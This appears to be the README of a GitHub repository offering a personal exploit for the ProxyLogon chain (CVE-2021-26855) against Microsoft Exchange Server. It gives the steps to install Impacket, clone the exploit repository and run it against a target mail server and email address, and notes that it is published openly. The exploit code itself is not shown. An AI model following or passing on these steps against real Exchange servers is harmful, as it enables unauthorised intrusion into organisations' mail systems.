# proxylogon
my exploit for the proxylogon chain (Microsoft Exchange Server - CVE-2021-26855)   
# Run:
the exploit uses Impacket package, to install it run this:
```
user@host:~$ python3 -m pip install impacket
```
then clone the exploit repo, and enter the exploit directory:
```
user@host:~$ git clone https://github.com/hakivvi/proxylogon.git && cd proxylogon
```
run the exploit:
```
user@host:~$ python3 proxylogon.py http://mail.corp.com email@corp.com
```




~~**this repo will remain private until DEVCORE or Microsorft releases the exploit details to the public**~~ **i think they won't :P**
